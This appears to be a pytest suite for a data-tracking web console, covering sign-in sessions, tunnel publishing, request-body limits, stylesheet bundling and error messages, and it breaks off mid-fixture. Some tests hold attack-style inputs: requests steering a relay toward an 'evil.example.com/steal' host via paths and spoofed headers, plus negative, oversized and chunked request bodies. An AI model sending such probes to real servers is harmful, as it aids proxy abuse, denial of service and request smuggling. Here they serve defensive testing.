def test_a_session_does_not_pass_to_whoever_inherits_the_account_id(gated, seeded_db):
    """`account.id` is a plain `INTEGER PRIMARY KEY`, so SQLite hands a deleted id out
    again to the next account created.

    A session that remembered only the id would then sign its holder in as that
    stranger — their watchlist, their name in the header — which is why a session
    also remembers a digest of the credential it was granted against, and a row
    under the same id with a different credential is not the same account.
    """
    address, console = gated
    console.gate.session_confirm_s = 0
    _, cookie = sign_in(address)
    _status, before = as_reader(address, cookie, "/api/dataset")
    old_id = console.gate.session_for(cookie.split("=", 1)[1])
    assert before["account"]["email"] == EMAIL

    _delete_account(seeded_db)
    new_id = _account(seeded_db, "mallory@example.com")
    assert new_id == old_id, "precondition: SQLite reused the id"

    status, after = as_reader(address, cookie, "/api/dataset")
    assert status == 401, f"the old cookie now reads as {after}"


def test_changing_a_password_signs_the_old_session_out(gated, seeded_db):
    """Somebody changes a password because they think it is known.

    A cookie that outlived the change would keep the person who knew it signed in
    for up to twelve hours, and the only way to kill it used to be restarting the
    console for everybody.
    """
    from tracker import accounts
    from tracker.db import open_db, session_scope

    address, console = gated
    console.gate.session_confirm_s = 0
    _, cookie = sign_in(address)
    with session_scope(open_db(seeded_db, readonly=False)) as session:
        accounts.set_password(session, EMAIL, "a different secret")

    assert raw(address, "/api/health", cookie=cookie)[0] == 401
    status, fresh = sign_in(address, "a different secret")
    assert status == 200
    assert raw(address, "/api/health", cookie=fresh)[0] == 200


def test_a_session_is_confirmed_against_its_account_at_most_once_a_window():
    """The database is asked about a session every few seconds, not every request.

    A page load is a dozen static files, all behind the gate. Each one reading the
    account row would be a real cost for an answer that changes about never — so a
    confirmation is good for `session_confirm_s`, and granting a session counts as
    one, because the sign-in has just read the row.
    """
    from tracker.webui.auth import Gate

    now = [100.0]
    gate = Gate(clock=lambda: now[0], session_confirm_s=5)
    asked: list[tuple[int, str]] = []

    def holds(account_id: int, stamp: str) -> bool:
        asked.append((account_id, stamp))
        return True

    token = gate.grant(7, stamp="credential")
    assert gate.session_for(token, confirm=holds) == 7
    assert asked == [], "a sign-in is a confirmation"

    now[0] += 6
    assert gate.session_for(token, confirm=holds) == 7
    assert asked == [(7, "credential")]

    now[0] += 1
    assert gate.session_for(token, confirm=holds) == 7
    assert len(asked) == 1, "inside the window again"


def test_a_session_whose_account_cannot_be_checked_is_refused_but_kept():
    """Three answers, not two.

    `False` — the account is gone or its credential changed — drops the session.
    `None` — the database could not be read just now — refuses *this* request and
    keeps the session, because signing everybody out over a transient read error
    would be a failure of its own.
    """
    from tracker.webui.auth import Gate

    now = [0.0]
    gate = Gate(clock=lambda: now[0], session_confirm_s=0)
    token = gate.grant(3, stamp="s")

    now[0] += 1
    assert gate.session_for(token, confirm=lambda *_: None) is None
    assert gate.session_for(token) == 3, "kept for when the database answers again"

    now[0] += 1
    assert gate.session_for(token, confirm=lambda *_: False) is None
    assert gate.session_for(token) is None, "dropped"


@pytest.fixture
def published(seeded_db):
    """A console started the way `tracker cloudflare` starts it: behind a tunnel."""
    from http.server import ThreadingHTTPServer

    _account(seeded_db)
    console = Console(seeded_db, published=True)
    handler = type("Bound", (Handler,), {"console": console})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    try:
        yield httpd.server_address, console
    finally:
        httpd.shutdown()
        httpd.server_close()
        console.close()


def test_a_published_console_fails_closed_when_its_last_account_goes(published, seeded_db):
    """Publishing with no accounts was refused at startup and nowhere after it.

    Whether a sign-in is needed is re-read from "does any account exist" every
    few seconds, so `tracker users rm` of the last account turned a tunnelled
    console into an open one — the whole dataset on a public URL — and the CLI
    said so as if it were good news ("open again"). A published console now
    requires a sign-in whatever the account count, so with none left it refuses
    everyone and says why on the one form it still serves.
    """
    address, console = published
    console.gate.session_confirm_s = 0
    _, cookie = sign_in(address)
    assert raw(address, "/api/dataset", cookie=cookie)[0] == 200

    _delete_account(seeded_db)
    console._auth_checked_at = 0.0  # the cache, expired
    assert console.auth_required is True, "a tunnel is not loopback, whatever the count"
    for path in ("/api/dataset", "/api/projects", "/api/health", "/static/app.js"):
        assert raw(address, path)[0] == 401, f"{path} was served on a published console"
        assert raw(address, path, cookie=cookie)[0] == 401, f"{path}: the old session too"
    status, _, body = raw(address, "/")
    assert status == 200 and "Sign in" in body, "the form, and nothing else"

    status, _, body = raw(address, "/api/login", "POST", {"email": EMAIL, "password": PASSWORD})
    assert status == 503
    assert "tracker users add" in body, "the refusal says what fixes it"


def test_a_loopback_console_still_opens_when_its_last_account_goes(gated, seeded_db):
    """The other half of the split, unchanged: on loopback, zero accounts is the
    no-setup default a fresh install has, because reaching 127.0.0.1 already means
    having the machine."""
    address, console = gated
    _delete_account(seeded_db)
    console._auth_checked_at = 0.0
    assert console.auth_required is False
    assert raw(address, "/api/dataset")[0] == 200


def test_publishing_tells_the_console_it_is_published(seeded_db, monkeypatch):
    """The flag has to reach the server from both ways of publishing, or the
    fail-closed rule protects nothing."""
    from typer.testing import CliRunner

    from tracker.cli import app

    class FakeTunnel:
        via_proxy, url, confirmed, kind = None, "https://console.example", True, "quick"

        def stop(self) -> None:
            pass

    _account(seeded_db)
    started: list[dict] = []
    monkeypatch.setattr("tracker.webui.server.serve", lambda path, **kw: started.append(kw))
    monkeypatch.setattr("tracker.webui.tunnel.find_cloudflared", lambda: "cloudflared")
    monkeypatch.setattr("tracker.webui.tunnel.quick_tunnel", lambda *a, **kw: FakeTunnel())
    runner = CliRunner()

    for argv in (["cloudflare", "--quick"], ["serve", "--tunnel", "--no-open"]):
        result = runner.invoke(app, ["--db", str(seeded_db), *argv])
        assert result.exit_code == 0, result.output
    assert [kw["published"] for kw in started] == [True, True]

    started.clear()
    assert runner.invoke(app, ["--db", str(seeded_db), "serve", "--no-open"]).exit_code == 0
    assert started[0]["published"] is False


def test_deleting_the_last_account_says_what_it_does_to_a_published_console(seeded_db):
    """It used to announce "the console is open again", which on the host — the
    only place a console is published — was the one outcome that must not happen."""
    from typer.testing import CliRunner

    from tracker.cli import app

    _account(seeded_db)
    runner = CliRunner()

    def said(result) -> str:
        return " ".join(result.output.split())  # Rich wraps at the runner's width

    declined = runner.invoke(app, ["--db", str(seeded_db), "users", "rm", EMAIL], input="n\n")
    assert "last account" in said(declined), "the prompt says so before anything goes"
    assert declined.exit_code != 0

    removed = runner.invoke(app, ["--db", str(seeded_db), "users", "rm", EMAIL, "--yes"])
    assert removed.exit_code == 0, removed.output
    assert "refuses every sign-in" in said(removed)
    assert "open again" not in said(removed)


def _exchange(address, head: bytes, *, wait: float = 5.0) -> bytes:
    """Send bytes exactly as given; return whatever came back before `wait` ran out.

    Raw rather than `http.client`, which refuses to send a negative Content-Length
    or a length its body does not match — and those are the requests under test.
    An empty result means the server said nothing in time, which is the failure.
    """
    import socket

    got = b""
    with socket.create_connection(address, timeout=wait) as sock:
        sock.sendall(head)
        try:
            while chunk := sock.recv(65536):
                got += chunk
        except TimeoutError:
            pass
    return got


def _post_head(path: str, *lines: str) -> bytes:
    return ("\r\n".join([f"POST {path} HTTP/1.1", "Host: 127.0.0.1", *lines, "", ""])).encode(
        "ascii"
    )


def test_a_negative_content_length_is_refused_at_once(gated):
    """`Content-Length: -1` used to reach `rfile.read(-1)`, which reads to end of
    stream — so one unauthenticated request held a server thread for as long as
    the client cared to keep the socket open."""
    address, _ = gated
    reply = _exchange(address, _post_head("/api/login", "Content-Length: -1"))
    assert reply.startswith(b"HTTP/1.1 400"), reply[:200]


def test_an_oversized_body_is_refused_before_it_is_read(gated):
    """The body was read whole before any check, sign-in included: measured, a 64 MiB
    POST to `/api/login` peaked at 132 MiB allocated. The refusal now comes from the
    header alone, so a client that announces 64 MiB and sends one byte is answered
    at once rather than waited for."""
    address, _ = gated
    head = _post_head("/api/login", "Content-Type: application/json", f"Content-Length: {64 << 20}")
    reply = _exchange(address, head + b"{")
    assert reply.startswith(b"HTTP/1.1 413"), reply[:200]
    assert b"Connection: close" in reply, "the unread body must not be parsed as a request"


def test_a_body_with_no_length_is_refused_rather_than_left_on_the_wire(gated):
    """A chunked body cannot be read by this server at all. Treating it as empty
    answered the request and then parsed the chunks as the next one."""
    address, _ = gated
    reply = _exchange(
        address, _post_head("/api/login", "Transfer-Encoding: chunked") + b'5\r\n{"a":\r\n0\r\n\r\n'
    )
    assert reply.startswith(b"HTTP/1.1 411"), reply[:200]


def test_the_largest_body_any_route_takes_still_fits(gated):
    """The cap is sized from the routes, not picked. The biggest legitimate body is a
    registration at every field's own limit, which is a few kilobytes."""
    from tracker.accounts import MAX_EMAIL_LEN, MAX_PASSWORD_LEN
    from tracker.webui.server import MAX_BODY

    body = {
        "code": "x" * 64,
        "email": "a" * (MAX_EMAIL_LEN - len("@example.com")) + "@example.com",
        "password": "p" * MAX_PASSWORD_LEN,
        "name": "n" * 200,
    }
    assert len(json.dumps(body)) * 4 < MAX_BODY, "room even if every character were 4 bytes"
    address, _ = gated
    status, _, _ = raw(address, "/api/register", "POST", body)
    assert status == 400, "refused as a bad code, not as too large"


def test_a_silent_connection_is_closed_rather_than_held(seeded_db):
    """With no socket timeout, a client that opens a connection and stops talking
    holds a thread forever — before signing in, since nothing has been read yet."""
    import socket
    import time as clock
    from http.server import ThreadingHTTPServer

    assert Handler.timeout is not None and 0 < Handler.timeout <= 60

    # And it is a timeout the stdlib acts on: shown with a short one, because the
    # real value is too long to wait out in a test.
    handler = type("Bound", (Handler,), {"console": Console(seeded_db), "timeout": 0.5})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    try:
        with socket.create_connection(httpd.server_address, timeout=10) as sock:
            sock.sendall(_post_head("/api/login", "Content-Length: 10") + b"{")
            started = clock.monotonic()
            while sock.recv(65536):
                pass
            assert clock.monotonic() - started < 5, "the server waited for the rest"
    finally:
        httpd.shutdown()
        httpd.server_close()


def test_the_password_check_is_constant_time():
    """Compare with hmac, so the secret cannot be recovered from timing."""
    import inspect

    from tracker import accounts

    source = inspect.getsource(accounts.verify_password)
    assert "compare_digest" in source
    assert "==" not in source.split("compare_digest")[1].split("\n")[0]


def test_a_tunnel_client_ip_is_only_trusted_from_loopback():
    """CF-Connecting-IP is a header, and headers are writable.

    It is read only when the socket itself is loopback — which behind cloudflared
    it always is, and from a direct remote connection it never is.
    """
    import inspect

    from tracker.webui import server as server_mod

    source = inspect.getsource(server_mod.Handler._client)
    assert "127.0.0.1" in source and "CF-Connecting-IP" in source


def test_the_run_log_does_not_wrap():
    """A Rich table's column positions are baked in at COLUMNS characters.

    `white-space: pre-wrap` folded every 132-character row of `tracker list` onto
    a second line in an 815px pane, so the `+--+` borders no longer lined up with
    the cells and the table came out shredded. There is no width but COLUMNS at
    which wrapping works, so the pane scrolls sideways instead — which is what a
    terminal does.

    Asserted against the stylesheet because the failure is purely a CSS one: the
    markup was always right.
    """
    from tracker.webui import assets

    css = (assets.STATIC_ROOT / "app.css").read_text(encoding="utf-8")
    # Comments stripped first: the block explains this rule at length and the
    # explanation naturally contains the word the assertion forbids.
    declarations = re.sub(r"/\*.*?\*/", "", css, flags=re.S)
    block = declarations.split(".dc-log {", 1)[1].split("}", 1)[0]
    assert "white-space: pre;" in block
    assert "pre-wrap" not in block, "the default log surface must not reflow Rich's tables"
    # The opt-in is still there for prose, and only as an opt-in.
    assert ".dc-log--wrap { white-space: pre-wrap;" in declarations


def test_a_log_line_is_as_wide_as_its_content():
    """Otherwise a coloured background stops at the pane edge, mid-row.

    With `white-space: pre` the text overflows a block that is only as wide as
    the container, so any run with a background — Rich's reversed headers — would
    be painted for 815px of a 983px line. It also makes the container's
    scrollWidth wrong, which is what the horizontal scrollbar is sized from.
    """
    from tracker.webui import assets

    css = re.sub(
        r"/\*.*?\*/", "", (assets.STATIC_ROOT / "app.css").read_text(encoding="utf-8"), flags=re.S
    )
    block = css.split(".dc-log-line {", 1)[1].split("}", 1)[0]
    assert "width: max-content;" in block
    assert "min-width: 100%;" in block


# --- assets -----------------------------------------------------------------


def test_every_file_the_page_needs_is_vendored():
    """A half-vendored install must fail with names, not a blank page."""
    from tracker.webui import assets

    assert assets.missing_vendor() == []


# --- publishing through cloudflared -----------------------------------------


def test_the_api_host_is_not_mistaken_for_a_tunnel():
    """`api.trycloudflare.com` appears in the failure message, not in a success.

    Observed live: the quick-tunnel request timed out, cloudflared printed
    `Post "https://api.trycloudflare.com/tunnel": context deadline exceeded`, the
    URL pattern matched it, and the console announced
    `public: https://api.trycloudflare.com` — a link to Cloudflare's API,
    presented as the operator's console. Reporting a tunnel that does not exist
    is the worst failure this module has, because the whole point of the command
    is the URL it prints.
    """
    from tracker.webui.tunnel import _QUICK_FAILED, _URL

    failure = (
        'failed to request quick Tunnel: Post "https://api.trycloudflare.com/tunnel": '
        "context deadline exceeded (Client.Timeout exceeded while awaiting headers)"
    )
    assert _URL.search(failure) is None
    assert _QUICK_FAILED.search(failure)

    banner = "|  https://itchy-narrow-pine-42.trycloudflare.com   |"
    assert _URL.search(banner).group(0) == "https://itchy-narrow-pine-42.trycloudflare.com"
    assert _QUICK_FAILED.search(banner) is None


def test_a_refused_tunnel_fails_at_once_rather_than_waiting_out_the_window():
    """cloudflared can report that it cannot get a tunnel and then keep running.

    Waiting the full 60s out would replace a precise reason with "did not publish
    a URL in time", a minute later. The reason is on the first line of output.
    """
    import subprocess

    from tracker.webui.tunnel import _QUICK_FAILED, TunnelFailed, _wait

    class Alive:
        def poll(self):
            return None

    tail = [
        "INF Requesting new quick Tunnel on trycloudflare.com...",
        "failed to request quick Tunnel: boom",
    ]
    with pytest.raises(TunnelFailed) as exc:
        _wait(
            Alive(),  # type: ignore[arg-type]
            [],
            tail,
            timeout_s=30,
            waiting_for="publishing a URL",
            give_up_on=_QUICK_FAILED,
        )
    assert "boom" in str(exc.value)
    assert subprocess  # the real callers pass a Popen; this stands in for one


def test_publishing_is_not_something_the_page_can_do_to_itself():
    """`cloudflare` is blocked in the console for the same reason `serve` is.

    Stronger than "it would hold the run slot": putting this page on the public
    internet is a decision for somebody at a terminal. A blocked command still
    appears in the palette with its argv, so the operator can copy the line.
    """
    assert "cloudflare" in catalog.BLOCKED
    with pytest.raises(catalog.InvalidRequest) as exc:
        catalog.build_argv("cloudflare", {})
    assert "cannot be run from the console" in str(exc.value)


def test_the_quick_tunnel_api_call_is_relayed_through_the_proxy(monkeypatch):
    """cloudflared ignores HTTPS_PROXY for exactly one request, and it matters.

    It builds its own `http.Transport` for the quick-tunnel call, and a
    zero-value Transport has no proxy function — so on a machine behind a proxy
    that one request goes direct. Measured on such a machine: direct swung
    between 3.8s and 28s over an hour while the proxy stayed near 4s, against a
    fixed client budget of about ten. `tracker cloudflare` failed with
    `context deadline exceeded` while curl, pip and the browser all worked.

    So the console stands a relay in front of it and points `--quick-service` at
    that. This asserts the flag is passed and the port is the relay's.
    """
    from tracker.webui import tunnel as tunnel_mod

    captured: list[list[str]] = []

    class FakeProcess:
        def poll(self):
            return None

        def terminate(self):
            pass

        def wait(self, timeout=None):
            return 0

    def fake_spawn(argv, _pattern):
        captured.append(argv)
        return FakeProcess(), ["https://itchy-narrow-pine-42.trycloudflare.com"], []

    monkeypatch.setattr(tunnel_mod, "find_cloudflared", lambda: "cloudflared")
    monkeypatch.setattr(tunnel_mod, "_check_runnable", lambda _binary: None)
    monkeypatch.setattr(tunnel_mod, "_spawn", fake_spawn)

    result = tunnel_mod.quick_tunnel(8765, proxy="http://127.0.0.1:8080")
    argv = captured[0]
    assert "--quick-service" in argv
    relayed = argv[argv.index("--quick-service") + 1]
    assert relayed.startswith("http://127.0.0.1:")
    assert result.via_proxy == "http://127.0.0.1:8080"
    result.stop()

    # And the escape hatch really escapes: no proxy, no relay, no flag.
    captured.clear()
    plain = tunnel_mod.quick_tunnel(8765, use_proxy=False)
    assert "--quick-service" not in captured[0]
    assert plain.via_proxy is None
    plain.stop()


def test_the_relay_is_not_an_open_proxy():
    """It forwards to one fixed host, whatever path is asked for.

    It binds a loopback port anything on the machine can reach, so "relay
    whatever you are told to" would be a real hole rather than a theoretical one.

    Asserted by watching what the relay asks a proxy to CONNECT to, because that
    is the thing that would actually be wrong. An earlier version of this test
    asserted `(QUICK_API + path).startswith(QUICK_API)`, which is a property of
    string concatenation and would have passed against any implementation at all.
    """
    import socket
    import threading as _threading
    from http.client import HTTPConnection as _HTTPConnection

    from tracker.webui.tunnel import QUICK_API, _QuickRelay

    assert QUICK_API == "https://api.trycloudflare.com"

    targets: list[str] = []
    stub = socket.socket()
    stub.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    stub.bind(("127.0.0.1", 0))
    stub.listen(8)

    def serve() -> None:
        # urllib tunnels https-through-http-proxy with `CONNECT host:443`.
        # Record the host and hang up; the relay then fails, which is fine —
        # the question is only ever where it tried to go.
        while True:
            try:
                conn, _ = stub.accept()
            except OSError:
                return
            with conn:
                first = conn.recv(4096).decode("latin-1", "replace").split("\r\n", 1)[0]
                if first.upper().startswith("CONNECT"):
                    targets.append(first.split()[1])

    thread = _threading.Thread(target=serve, daemon=True)
    thread.start()

    # Every shape an attacker on this machine could try: a path that looks like a
    # host, an absolute request URI, and headers that a naive implementation
    # might honour. None of them may change where the relay goes.
    attempts = [
        ("//evil.example.com/steal", {}),
        ("http://evil.example.com/steal", {}),
        ("/tunnel", {"X-Upstream": "https://evil.example.com", "Host": "evil.example.com"}),
    ]

    relay = _QuickRelay(f"http://127.0.0.1:{stub.getsockname()[1]}")
    try:
        assert relay.start().startswith("http://127.0.0.1:")
        for path, headers in attempts:
            client = _HTTPConnection("127.0.0.1", relay.port, timeout=20)
            try:
                client.request("POST", path, body=b"", headers=headers)
                client.getresponse().read()
            except Exception:
                pass  # a mangled upstream failing early is a pass, not a problem
            finally:
                client.close()
    finally:
        relay.stop()
        stub.close()
        thread.join(timeout=5)

    assert set(targets) <= {"api.trycloudflare.com:443"}, f"relay reached out to {targets}"
    assert targets, "the relay never called out at all — the test proved nothing"


def test_a_proxy_is_found_in_the_environment(monkeypatch):
    """Environment first; a bare host:port is given a scheme so Go can parse it."""
    from tracker.webui.tunnel import detect_proxy

    for name in (
        "HTTPS_PROXY",
        "https_proxy",
        "ALL_PROXY",
        "all_proxy",
        "HTTP_PROXY",
        "http_proxy",
    ):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("HTTPS_PROXY", "127.0.0.1:8080")
    assert detect_proxy() == "http://127.0.0.1:8080"
    monkeypatch.setenv("HTTPS_PROXY", "http://proxy.example:3128")
    assert detect_proxy() == "http://proxy.example:3128"


def test_a_slow_minute_is_retried(monkeypatch):
    """The failure being retried is a latency race, not a refusal.

    The same request measured 3.8s and 28s an hour apart on one link. A second
    attempt is the proportionate response to that; giving up on the first is not.
    """
    from tracker.webui import tunnel as tunnel_mod

    monkeypatch.setattr(tunnel_mod.time, "sleep", lambda _s: None)
    calls = {"n": 0}

    def flaky(port, *, timeout_s, proxy, use_proxy):
        calls["n"] += 1
        if calls["n"] < 3:
            raise tunnel_mod.TunnelFailed("context deadline exceeded")
        return "a tunnel"

    monkeypatch.setattr(tunnel_mod, "_quick_tunnel_once", flaky)
    assert tunnel_mod.quick_tunnel(8765, attempts=3) == "a tunnel"
    assert calls["n"] == 3

    # And it still gives up, with the last real reason rather than a summary.
    calls["n"] = 0
    monkeypatch.setattr(
        tunnel_mod,
        "_quick_tunnel_once",
        lambda *a, **k: (_ for _ in ()).throw(tunnel_mod.TunnelFailed("still slow")),
    )
    with pytest.raises(tunnel_mod.TunnelFailed, match="still slow"):
        tunnel_mod.quick_tunnel(8765, attempts=2)


def test_a_named_tunnel_is_run_never_created(monkeypatch):
    """Creating one writes credentials and a DNS record that outlive the process.

    So an account with no tunnels gets the three commands to run rather than
    having them run for it.
    """
    from tracker.webui import tunnel as tunnel_mod

    monkeypatch.setattr(tunnel_mod, "find_cloudflared", lambda: "cloudflared")
    monkeypatch.setattr(tunnel_mod, "_check_runnable", lambda _binary: None)
    monkeypatch.setattr(tunnel_mod, "named_tunnels", lambda _binary=None: [])

    with pytest.raises(tunnel_mod.TunnelNotFound) as exc:
        tunnel_mod.named_tunnel(8765, "console")
    message = str(exc.value)
    assert "cloudflared tunnel create console" in message
    assert "route dns" in message

    monkeypatch.setattr(tunnel_mod, "named_tunnels", lambda _binary=None: ["other"])
    with pytest.raises(tunnel_mod.TunnelNotFound) as exc:
        tunnel_mod.named_tunnel(8765, "console")
    assert "This account has: other" in str(exc.value)


def test_the_named_tunnel_argv_pins_the_port_the_console_listens_on(monkeypatch):
    """`--url` before `run` supplies the ingress, so no config.yml can disagree."""
    from tracker.webui import tunnel as tunnel_mod

    captured: list[list[str]] = []

    class FakeProcess:
        def poll(self):
            return None

        def terminate(self):
            pass

    def fake_spawn(argv, _pattern):
        captured.append(argv)
        return FakeProcess(), ["Registered tunnel connection"], []

    monkeypatch.setattr(tunnel_mod, "find_cloudflared", lambda: "cloudflared")
    monkeypatch.setattr(tunnel_mod, "_check_runnable", lambda _binary: None)
    monkeypatch.setattr(tunnel_mod, "named_tunnels", lambda _binary=None: ["console"])
    monkeypatch.setattr(tunnel_mod, "_spawn", fake_spawn)

    result = tunnel_mod.named_tunnel(9001, "console", hostname="dc.example.com")
    assert captured[0] == [
        "cloudflared",
        "tunnel",
        "--no-autoupdate",
        "--url",
        "http://127.0.0.1:9001",
        "run",
        "console",
    ]
    assert result.url == "https://dc.example.com"
    assert result.kind == "named" and result.confirmed


def test_a_named_tunnel_without_a_hostname_says_unknown_rather_than_guessing():
    """The DNS route lives in your zone, not in the tunnel's output."""
    from tracker.webui.tunnel import Tunnel

    class FakeProcess:
        def poll(self):
            return 0

    assert Tunnel(url=None, process=FakeProcess(), kind="named").url is None  # type: ignore[arg-type]


def test_the_meridian_bundle_is_complete():
    """It arrives truncated at the read API's 256 KiB cap and is repaired.

    The failure mode is silent — every component definition is present, only the
    trailing export block is cut, so the file parses as far as the browser gets
    and then registers nothing. Guard the shape rather than a byte count.
    """
    from tracker.webui import assets

    bundle = (assets.STATIC_ROOT / "vendor/meridian/_ds_bundle.js").read_text(encoding="utf-8")
    assert bundle.rstrip().endswith("})();"), "the bundle's IIFE is not closed"
    for component in ("Button", "Card", "Table", "Tabs", "StatCard", "EmptyState", "Skeleton"):
        assert f"__ds_ns.{component} = __ds_scope.{component};" in bundle


def test_capex_positions_carry_the_ids_behind_their_numbers(server):
    """Ids only, like the duplicate groups — the page looks the rows up."""
    address, _ = server
    _status, capex = request(address, "/api/capex")
    position = next(p for p in capex["positions"] if p["key"] == "microsoft")
    assert position["project_ids"], "a counted position must name its rows"
    assert all(isinstance(i, int) for i in position["project_ids"])
    assert len(position["project_ids"]) == position["projects"]
    assert position["duplicate_skipped_ids"] == []


def test_the_position_briefing_endpoint_guards_before_it_spends(server):
    """Bad key → 404, no confirm → 400; neither costs a model call."""
    address, _ = server
    status, body = request(address, "/api/capex/overview/stream", "POST", {})
    assert status == 400 and "key" in body["error"]

    status, body = request(
        address, "/api/capex/overview/stream", "POST", {"key": "nobody-of-that-name"}
    )
    assert status == 404

    status, body = request(address, "/api/capex/overview/stream", "POST", {"key": "microsoft"})
    assert status == 400 and "confirm" in body["error"]


# --- one stylesheet, versioned as a whole ------------------------------------


def test_a_stylesheet_is_served_with_its_imports_folded_in(server):
    """`stamp` versioned every URL the page references and nothing the stylesheet
    itself pulls in, so a browser or an edge cache could hold one layer from last
    month behind a parent that looked current. The visible symptom was the form
    layer missing: every dropdown fell back to a native control with the custom
    chevron still drawn beside it."""
    address, _ = server
    status, body = request(address, "/static/vendor/meridian/styles.css")
    assert status == 200
    assert "@import url(" not in body
    assert ".mrd-select{" in body.replace("\n", ""), "the form layer is in the one response"


def test_relative_asset_urls_survive_being_inlined(server):
    """`tokens/fonts.css` asks for `../../fonts/Inter.woff2`. Folded into the parent
    without rewriting, that resolves one directory too high and the console
    silently loses its fonts."""
    address, _ = server
    _, body = request(address, "/static/vendor/meridian/styles.css")
    assert "/static/vendor/fonts/" in body
    assert "../../fonts/" not in body


def test_editing_any_layer_changes_the_parent_url(tmp_path, monkeypatch):
    """The whole mechanism. An unchanged tree keeps its token and stays cached."""
    from tracker.webui import assets

    root = tmp_path / "static"
    (root / "css").mkdir(parents=True)
    parent = root / "main.css"
    child = root / "css" / "layer.css"
    parent.write_text('@import url("./css/layer.css");\n', encoding="utf-8")
    child.write_text(".a{color:red}\n", encoding="utf-8")
    monkeypatch.setattr(assets, "STATIC_ROOT", root)

    before = assets.version_token(parent)
    assert assets.version_token(parent) == before
    child.write_text(".a{color:blue}\n", encoding="utf-8")
    assert assets.version_token(parent) != before
    assert ".a{color:blue}" in assets.bundle_css(parent)


def test_a_missing_layer_stays_a_missing_layer(tmp_path, monkeypatch):
    """A 404 in the network panel is a better failure than a stylesheet that
    quietly lost a third of its rules."""
    from tracker.webui import assets

    root = tmp_path / "static"
    root.mkdir(parents=True)
    parent = root / "main.css"
    parent.write_text('@import url("./nope.css");\n.b{color:red}\n', encoding="utf-8")
    monkeypatch.setattr(assets, "STATIC_ROOT", root)

    bundled = assets.bundle_css(parent)
    assert "@import" in bundled and "nope.css" in bundled
    assert ".b{color:red}" in bundled


# --- the inference endpoint ---------------------------------------------------


def test_the_infer_route_guards_before_it_spends(server):
    address, _ = server
    status, body = request(address, "/api/infer", "POST", {"project_id": 1})
    assert status == 400 and 'confirm="infer"' in body["error"]

    status, body = request(address, "/api/infer", "POST", {"project_id": 9999, "confirm": "infer"})
    assert status == 404

    status, body = request(address, "/api/infer", "POST", {"confirm": "infer"})
    assert status == 400 and "must be an integer" in body["error"]


def test_the_infer_route_returns_the_analysis_as_structure(server, monkeypatch):
    """Structured, not prose: the panel ranks obstacles and signals by the model's
    own confidence, and cannot do that with a paragraph."""
    from tracker import infer as infer_mod

    def fake(project, **kwargs):
        return infer_mod.Analysis(
            project_id=project.id,
            model="test-model",
            obstacles=[infer_mod.InferredRisk("transmission", "material", "because", 0.8)],
            signals=[infer_mod.InferredSignal("an interconnection filing", "public", 0.7)],
        )

    monkeypatch.setattr("tracker.infer.analyse", fake)
    # The suite runs without an API key on purpose, and the route builds its
    # extractor before it calls `analyse`.
    monkeypatch.setattr("tracker.llm.reasoning_extractor", lambda settings=None: object())
    address, _ = server
    status, body = request(address, "/api/infer", "POST", {"project_id": 1, "confirm": "infer"})

    assert status == 200
    assert body["model"] == "test-model"
    assert body["obstacles"][0]["category"] == "transmission"
    assert body["signals"][0]["confidence"] == 0.7
    assert body["rejected"] == []


# --- a process whose source moved underneath it --------------------------------


def test_a_stale_process_says_so_instead_of_blaming_the_database(server, monkeypatch):
    """This server reads its Python once and its files every request.

    Merge under a running instance and it becomes half of each: modules loaded at
    startup stay yesterday's, and anything first imported afterwards is loaded
    fresh from today's files. Observed live — a console published at 23:19
    answered `/api/dataset` with "internal error" the next day, because `capex`
    had never been imported, so the first request after a merge loaded the new
    one, which imports `tracker.pairs`, which imports `NotDuplicate` from a
    `tracker.models` that had been in memory since the previous evening.

    The database was read successfully on that very request. Reporting it as a
    database fault cost an hour, so the shape of the failure is asserted here:
    503, not 500, and a sentence naming the restart.
    """

    def explode(*args, **kwargs):
        raise ImportError("cannot import name 'NotDuplicate' from 'tracker.models'")

    monkeypatch.setattr("tracker.webui.dataset.light", explode)
    address, _ = server
    status, body = request(address, "/api/dataset")

    assert status == 503, "not a 500: this is a diagnosable condition with a known fix"
    assert "NotDuplicate" in body["error"], "the original import failure survives"
    assert "Restart the console" in body["error"]
    assert "Nothing is wrong with the database" in body["error"]


def test_a_stale_process_is_caught_on_the_write_routes_too(server, monkeypatch):
    def explode(*args, **kwargs):
        raise ImportError("no module named 'tracker.pairs'")

    monkeypatch.setattr("tracker.infer.analyse", explode)
    monkeypatch.setattr("tracker.llm.reasoning_extractor", lambda settings=None: object())
    address, _ = server
    status, body = request(address, "/api/infer", "POST", {"project_id": 1, "confirm": "infer"})

    assert status == 503
    assert "Restart the console" in body["error"]


def test_the_consoles_own_error_is_never_reported_as_the_console_being_down(server, monkeypatch):
    """`unreachable` means something in front answered instead of the console.

    A JSON `error` body is proof that it did not — that shape comes from
    `Handler._error` and nowhere else. The client used to read any 503 as a
    gateway failure, so the console's own "restart me" answer arrived under the
    heading "The console is not answering", which sends the reader to check a
    tunnel that is working.
    """
    from tracker.webui import assets

    served = assets.STATIC_ROOT / "app.js"
    source = served.read_text(encoding="utf-8")
    assert "const answered = payload?.error != null" in source
    assert "_isGateway(res.status) && !answered" in source
    # And the panel needs the code to tell the two apart, which means carrying it.
    assert "status: e.status," in source


# --- The article reader ------------------------------------------------------
#
# The sources modal used to frame the live page. Measured across the fifteen
# most-cited publishers, ten refuse — `X-Frame-Options` or `frame-ancestors` —
# carrying 388 of their 689 citations, `datacenterdynamics.com` (the most-cited
# publisher in the database) among them. So the modal renders a reader view of
# our own instead, and these guard the endpoint that serves it.

# Long enough that readability's scoring can tell the article from the furniture.
# On a three-sentence page it keeps everything, which says nothing about the
# algorithm — measured on a live `datacenterdynamics.com` page it drops the
# navigation and all fourteen promo images.
_FILLER = (
    "<p>Construction is expected to run through the following two years, with the "
    "first halls energised ahead of the remainder of the campus, according to "
    "filings reviewed by this publication and people familiar with the schedule.</p>"
) * 6

ARTICLE_HTML = f"""<html><head><title>Fairwater | Microsoft News</title></head><body>
<nav><a href="/x">Home</a><a href="/y">Search</a></nav>
<article>
  <h2>Ground broken at Mount Pleasant</h2>
  <p>Microsoft broke ground at Mount Pleasant this week, the company confirmed on Tuesday
     after months of speculation about the site and its eventual size.</p>
  <p>The <em>campus</em> will draw 900 MW at full build, the company said, making it one of
